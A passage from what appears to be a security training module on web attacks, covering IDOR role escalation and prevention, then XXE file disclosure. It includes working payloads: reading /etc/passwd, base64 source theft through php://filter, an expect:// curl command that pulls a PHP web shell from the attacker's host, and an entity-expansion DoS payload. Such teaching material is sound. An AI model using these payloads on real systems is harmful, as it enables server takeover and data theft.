+</code></pre>
+<p>We may modify the admin's details and then perform one of the above attacks to take over their account. However, as we now know the admin role name (<code>web_admin</code>), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the <code>Update profile</code> button and change our role to <code>web_admin</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_modify\_our\_role.jpg" alt="modify\_our\_role"></p>
+<p>This time, we do not get the <code>Invalid role</code> error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we <code>GET</code> our user details, we see that our <code>role</code> has indeed been set to <code>web_admin</code>:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+    <span class="hljs-attr">"uid"</span>: <span class="hljs-string">"1"</span>,
+    <span class="hljs-attr">"uuid"</span>: <span class="hljs-string">"40f5888b67c748df7efba008e7c2f9d2"</span>,
+    <span class="hljs-attr">"role"</span>: <span class="hljs-string">"web_admin"</span>,
+    <span class="hljs-attr">"full_name"</span>: <span class="hljs-string">"Amy Lindon"</span>,
+    <span class="hljs-attr">"email"</span>: <span class="hljs-string">"a_lindon@employees.htb"</span>,
+    <span class="hljs-attr">"about"</span>: <span class="hljs-string">"A Release is like a boat. 80% of the holes plugged is not good enough."</span>
+}
+</code></pre>
+<p>Now, we can refresh the page to update our cookie, or manually set it as <code>Cookie: role=web_admin</code>, and then intercept the <code>Update</code> request to create a new user and see if we'd be allowed to do so:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_create\_new\_user\_2.jpg" alt="create\_new\_user\_2"></p>
+<p>We did not get an error message this time. If we send a <code>GET</code> request for the new user, we see that it has been successfully created:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_get\_new\_user.jpg" alt="create\_new\_user\_2"></p>
+<p>By combining the information we gained from the <code>IDOR Information Disclosure vulnerability</code> with an <code>IDOR Insecure Function Calls</code> attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.</p>
+<p>With our new <code>role</code>, we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profiles or changing their email to an email we specify. <code>Try to write a script that changes all users' email to an email you choose.</code>. You may do so by retrieving their <code>uuids</code> and then sending a <code>PUT</code> request for each with the new email.</p>
+<h2 id="idor-prevention">IDOR Prevention</h2>
+<hr>
+<p>We learned various ways to identify and exploit IDOR vulnerabilities in web pages, web functions, and API calls. By now, we should have understood that IDOR vulnerabilities are mainly caused by improper access control on the back-end servers. To prevent such vulnerabilities, we first have to build an object-level access control system and then use secure references for our objects when storing and calling them.</p>
+<hr>
+<h3 id="object-level-access-control">Object-Level Access Control</h3>
+<p>An Access Control system should be at the core of any web application since it can affect its entire design and structure. To properly control each area of the web application, its design has to support the segmentation of roles and permissions in a centralized manner. However, Access Control is a vast topic, so we will only focus on its role in IDOR vulnerabilities, represented in <code>Object-Level</code> access control mechanisms.</p>
+<p>User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system. To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource.</p>
+<p>Once an RBAC has been implemented, each user would be assigned a role that has certain privileges. Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting. They would only be allowed to access it if they have the right to do so.</p>
+<p>There are many ways to implement an RBAC system and map it to the web application's objects and resources, and designing it in the core of the web application's structure is an art to perfect. The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript"><span class="hljs-built_in">match</span> /api/<span class="hljs-keyword">profile</span>/{<span class="hljs-keyword">user</span>Id} {
+    allow read, write: if <span class="hljs-keyword">user</span>.isAuth == true
+    &amp;&amp; (<span class="hljs-keyword">user</span>.uid == <span class="hljs-keyword">user</span>Id || <span class="hljs-keyword">user</span>.roles == 'admin');
+}
+</code></pre>
+<p>The above example uses the <code>user</code> token, which can be <code>mapped from the HTTP request made to the RBAC</code> to retrieve the user's various roles and privileges. Then, it only allows read/write access if the user's <code>uid</code> in the RBAC system matches the <code>uid</code> in the API endpoint they are requesting. Furthermore, if a user has <code>admin</code> as their role in the back-end RBAC, they are allowed read/write access.</p>
+<p>In our previous attacks, we saw examples of the user role being stored in the user's details or in their cookie, both of which are under the user's control and can be manipulated to escalate their access privileges. The above example demonstrates a safer approach to mapping user roles, as the user privileges <code>were not be passed through the HTTP request</code>, but mapped directly from the RBAC on the back-end using the user's logged-in session token as an authentication mechanism.</p>
+<p>There's a lot more to access control systems and RBACs, as they can be some of the most challenging systems to design. This, however, should give us an idea of how we should control user access over web applications' objects and resources.</p>
+<hr>
+<h3 id="object-referencing">Object Referencing</h3>
+<p>While the core issue with IDOR lies in broken access control (<code>Insecure</code>), having access to direct references to objects (<code>Direct Object Referencing</code>) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented.</p>
+<p>Even after building a solid access control system, we should never use object references in clear text or simple patterns (e.g. <code>uid=1</code>). We should always use strong and unique references, like salted hashes or <code>UUID</code>'s. For example, we can use <code>UUID V4</code> to generate a strongly randomized id for any element, which looks something like (<code>89c9b29b-d19f-4515-b2dd-abb6e693eb20</code>). Then, we can map this <code>UUID</code> to the object it is referencing in the back-end database, and whenever this <code>UUID</code> is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-string">$u</span>id = intval(<span class="hljs-string">$_</span>REQUEST[<span class="hljs-string">'uid'</span>]);
+<span class="hljs-string">$q</span>uery = <span class="hljs-comment">"SELECT url FROM documents where uid="</span> . <span class="hljs-string">$u</span>id;
+<span class="hljs-string">$r</span>esult = mysqli_query(<span class="hljs-string">$c</span>onn, <span class="hljs-string">$q</span>uery);
+<span class="hljs-string">$r</span>ow = mysqli_fetch_array(<span class="hljs-string">$r</span>esult));
+echo <span class="hljs-comment">"&lt;a href='"</span> . <span class="hljs-string">$r</span>ow[<span class="hljs-string">'url'</span>] . <span class="hljs-comment">"' target='_blank'&gt;&lt;/a&gt;"</span>;
+</code></pre>
+<p>Furthermore, as we have seen previously in the module, we should never calculate hashes on the front-end. We should generate them when an object is created and store them in the back-end database. Then, we should create database maps to enable quick cross-referencing of objects and references.</p>
+<p>Finally, we must note that using <code>UUID</code>s may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system. Furthermore, some of the techniques we learned in this module would work even with unique references if the access control system is broken, like repeating one user's request with another user's session, as we have previously seen.</p>
+<p>If we implement both of these security mechanisms, we should be relatively safe against IDOR vulnerabilities.</p>
+<h2 id="intro-to-xxe">Intro to XXE</h2>
+<hr>
+<p><code>XML External Entity (XXE) Injection</code> vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down, which is why it is considered one of the <a href="https://owasp.org/www-project-top-ten/">Top 10 Web Security Risks</a> by OWASP.</p>
+<hr>
+<h3 id="xml">XML</h3>
+<p><code>Extensible Markup Language (XML)</code> is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a <code>tag</code>, and the first element is called the <code>root element</code>, while other elements are <code>child elements</code>.</p>
+<p>Here we see a basic example of an XML document representing an e-mail document structure:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span>01-01-2022<span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">time</span>&gt;</span>10:00 am UTC<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span>john@inlanefreight.com<span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">recipients</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>HR@inlanefreight.com<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">cc</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>billing@inlanefreight.com<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>payslips@inlanefreight.com<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">cc</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">recipients</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+  Hello,
+      Kindly share with me the invoice for the payment made on January 1, 2022.
+  Regards,
+  John
+  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> 
+<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>
+</code></pre>
+<p>The above example shows some of the key elements of an XML document, like:</p>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Definition</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Tag</code></td>
+<td>The keys of an XML document, usually wrapped with (<code>&lt;</code>/<code>&gt;</code>) characters.</td>
+<td><code>&lt;date&gt;</code></td>
+</tr>
+<tr>
+<td><code>Entity</code></td>
+<td>XML variables, usually wrapped with (<code>&amp;</code>/<code>;</code>) characters.</td>
+<td><code>&amp;lt;</code></td>
+</tr>
+<tr>
+<td><code>Element</code></td>
+<td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td>
+<td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td>
+</tr>
+<tr>
+<td><code>Attribute</code></td>
+<td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td>
+<td><code>version="1.0"</code>/<code>encoding="UTF-8"</code></td>
+</tr>
+<tr>
+<td><code>Declaration</code></td>
+<td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td>
+<td><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<p>Furthermore, some characters are used as part of an XML document structure, like <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, or <code>"</code>. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>, <code>&amp;quot;</code>). Finally, we can write comments in XML documents between <code>&lt;!--</code> and <code>--&gt;</code>, similar to HTML documents.</p>
+<hr>
+<h3 id="xml-dtd">XML DTD</h3>
+<p><code>XML Document Type Definition (DTD)</code> allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml">&lt;!DOCTYPE email [
+  &lt;!ELEMENT email (<span class="hljs-built_in">date</span>, <span class="hljs-built_in">time</span>, sender, recipients, body)&gt;
+  &lt;!ELEMENT recipients (<span class="hljs-keyword">to</span>, cc?)&gt;
+  &lt;!ELEMENT cc (<span class="hljs-keyword">to</span>*)&gt;
+  &lt;!ELEMENT <span class="hljs-built_in">date</span> (<span class="hljs-comment">#PCDATA)&gt;</span>
+  &lt;!ELEMENT <span class="hljs-built_in">time</span> (<span class="hljs-comment">#PCDATA)&gt;</span>
+  &lt;!ELEMENT sender (<span class="hljs-comment">#PCDATA)&gt;</span>
+  &lt;!ELEMENT <span class="hljs-keyword">to</span>  (<span class="hljs-comment">#PCDATA)&gt;</span>
+  &lt;!ELEMENT body (<span class="hljs-comment">#PCDATA)&gt;</span>
+]&gt;
+</code></pre>
+<p>As we can see, the DTD is declaring the root <code>email</code> element with the <code>ELEMENT</code> type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by <code>PCDATA</code>).</p>
+<p>The above DTD can be placed within the XML document itself, right after the <code>XML Declaration</code> in the first line. Otherwise, it can be stored in an external file (e.g. <code>email.dtd</code>), and then referenced within the XML document with the <code>SYSTEM</code> keyword, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE email SYSTEM "email.dtd"&gt;</span>
+</code></pre>
+<p>It is also possible to reference a DTD through a URL, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd"&gt;</span>
+</code></pre>
+<p>This is relatively similar to how HTML documents define and reference JavaScript and CSS scripts.</p>
+<hr>
+<h3 id="xml-entities">XML Entities</h3>
+<p>We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the <code>ENTITY</code> keyword, which is followed by the entity name and its value, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY company "Inlane Freight"&gt;
+]&gt;</span>
+</code></pre>
+<p>Once we define an entity, it can be referenced in an XML document between an ampersand <code>&amp;</code> and a semi-colon <code>;</code> (e.g. <code>&amp;company;</code>). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can <code>reference External XML Entities</code> with the <code>SYSTEM</code> keyword, which is followed by the external entity's path, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "http://localhost/company.txt"&gt;
+  &lt;!ENTITY signature SYSTEM "file:///var/www/html/signature.txt"&gt;
+]&gt;</span>
+</code></pre>
+<p>Note: We may also use the <code>PUBLIC</code> keyword instead of <code>SYSTEM</code> for loading external resources, which is used with publicly declared entities and standards, such as a language code (<code>lang="en"</code>). In this module, we'll be using <code>SYSTEM</code>, but we should be able to use either in most cases.</p>
+<p>This works similarly to internal XML entities defined within documents. When we reference an external entity (e.g. <code>&amp;signature;</code>), the parser will replace the entity with its value stored in the external file (e.g. <code>signature.txt</code>). <code>When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity</code>.</p>
+<p>In the next section, we will see how we can use External XML Entities to read local files or even perform more malicious actions.</p>
+<h2 id="local-file-disclosure">Local File Disclosure</h2>
+<hr>
+<p>When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.</p>
+<p>Let us see how we can identify potential XXE vulnerabilities and exploit them to read sensitive files from the back-end server.</p>
+<hr>
+<h3 id="identifying">Identifying</h3>
+<p>The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has a <code>Contact Form</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_identify.jpg" alt=""></p>
+<p>If we fill the contact form and click on <code>Send Data</code>, then intercept the HTTP request with Burp, we get the following request:</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_request.jpg" alt="xxe\_request"></p>
+<p>As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.</p>
+<p>If we send the form without any modification, we get the following message:</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_response.jpg" alt="xxe\_response"></p>
+<p>We see that the value of the <code>email</code> element is being displayed back to us on the page. To print the content of an external file to the page, we should <code>note which elements are being displayed, such that we know which elements to inject into</code>. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.</p>
+<p>For now, we know that whatever value we place in the <code>&lt;email&gt;&lt;/email&gt;</code> element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the <code>email</code> element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY company "Inlane Freight"&gt;
+]&gt;</span>
+</code></pre>
+<p>Note: In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the <code>DOCTYPE</code> was already declared in the XML request, we would just add the <code>ENTITY</code> element to it.</p>
+<p>Now, we should have a new XML entity called <code>company</code>, which we can reference with <code>&amp;company;</code>. So, instead of using our email in the <code>email</code> element, let us try using <code>&amp;company;</code>, and see whether it will be replaced with the value we defined (<code>Inlane Freight</code>):</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_new\_entity.jpg" alt="new\_entity"></p>
+<p>As we can see, the response did use the value of the entity we defined (<code>Inlane Freight</code>) instead of displaying <code>&amp;company;</code>, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (<code>&amp;company;</code>) as a raw value. <code>This confirms that we are dealing with a web application vulnerable to XXE</code>.</p>
+<p>Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the <code>Content-Type</code> header to <code>application/xml</code>, and then convert the JSON data to XML with an <a href="https://www.convertjson.com/json-to-xml.htm">online tool</a>. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.</p>
+<hr>
+<h3 id="reading-sensitive-files">Reading Sensitive Files</h3>
+<p>Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the <code>SYSTEM</code> keyword and define the external reference path after it, as we have learned in the previous section:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "file:///etc/passwd"&gt;
+]&gt;</span>
+</code></pre>
+<p>Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_external\_entity.jpg" alt="external\_entity"></p>
+<p>We see that we did indeed get the content of the <code>/etc/passwd</code> file, <code>meaning that we have successfully exploited the XXE vulnerability to read local files</code>. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an <code>id_rsa</code> SSH key of a specific user, which may grant us access to the back-end server. We can refer to the <a href="https://academy.hackthebox.com/course/preview/file-inclusion">File Inclusion / Directory Traversal</a> module to see what attacks can be carried out through local file disclosure.</p>
+<p>Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.</p>
+<hr>
+<h3 id="reading-source-code">Reading Source Code</h3>
+<p>Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a <code>Whitebox Penetration Test</code> to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.</p>
+<p>So, let us see if we can use the same attack to read the source code of the <code>index.php</code> file, as follows:</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_file\_php.jpg" alt="file\_php"></p>
+<p>As we can see, this did not work, as we did not get any content. This happened because <code>the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity</code>. If a file contains some of XML's special characters (e.g. <code>&lt;</code>/<code>&gt;</code>/<code>&amp;</code>), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.</p>
+<p>Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using <code>file://</code> as our reference, we will use PHP's <code>php://filter/</code> wrapper. With this filter, we can specify the <code>convert.base64-encode</code> encoder as our filter, and then add an input resource (e.g. <code>resource=index.php</code>), as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+]&gt;</span>
+</code></pre>
+<p>With that, we can send our request, and we will get the base64 encoded string of the <code>index.php</code> file:</p>
+<p><img src="storage\modules\134\web\_attacks\_xxe\_php\_filter.jpg" alt="file\_php"></p>
+<p>We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the <a href="https://academy.hackthebox.com/module/details/23">File Inclusion / Directory Traversal</a> module.</p>
+<p><code>This trick only works with PHP web applications.</code> The next section will discuss a more advanced method for reading source code, which should work with any web framework.</p>
+<hr>
+<h3 id="remote-code-execution-with-xxe">Remote Code Execution with XXE</h3>
+<p>In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for <code>ssh</code> keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the <code>PHP://expect</code> filter, though this requires the PHP <code>expect</code> module to be installed and enabled.</p>
+<p>If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as <code>expect://id</code>, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.</p>
+<p>The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:</p>
+<p>Local File Disclosure</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo '<span class="php"><span class="hljs-meta">&lt;?php</span> system($_REQUEST[<span class="hljs-string">"cmd"</span>]);<span class="hljs-meta">?&gt;</span></span>' &gt; shell.php
+root@htb[/htb]$ sudo python3 -m http.server 80
+</code></pre>
+<p>Now, we can use the following XML code to execute a <code>curl</code> command that downloads our web shell into the remote server:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'"&gt;
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">tel</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">tel</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>&amp;company;<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>
+</code></pre>
+<p>Note: We replaced all spaces in the above XML code with <code>$IFS</code>, to avoid breaking the XML syntax. Furthermore, many other characters like <code>|</code>, <code>&gt;</code>, and <code>{</code> may break the code, so we should avoid using them.</p>
+<p>Once we send the request, we should receive a request on our machine for the <code>shell.php</code> file, after which we can interact with the web shell on the remote server for code execution.</p>
+<p>Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.</p>
+<h3 id="other-xxe-attacks">Other XXE Attacks</h3>
+<p>Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability. The <a href="https://academy.hackthebox.com/course/preview/server-side-attacks">Server-Side Attacks</a> module thoroughly covers SSRF, and the same techniques can be carried with XXE attacks.</p>
+<p>Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-params">&lt;?xml version="<span class="hljs-number">1.0</span>"?&gt;</span>
+<span class="hljs-params">&lt;!DOCTYPE email [
+  &lt;!ENTITY a0 "DOS" &gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a1 "<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;<span class="hljs-variable">&amp;a0</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a2 "<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;<span class="hljs-variable">&amp;a1</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a3 "<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;<span class="hljs-variable">&amp;a2</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a4 "<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;<span class="hljs-variable">&amp;a3</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a5 "<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;<span class="hljs-variable">&amp;a4</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a6 "<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;<span class="hljs-variable">&amp;a5</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a7 "<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;<span class="hljs-variable">&amp;a6</span>;"&gt;</span>
+  <span class="hljs-params">&lt;!ENTITY a8 "<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;<span class="hljs-variable">&amp;a7</span>;"&gt;</span>
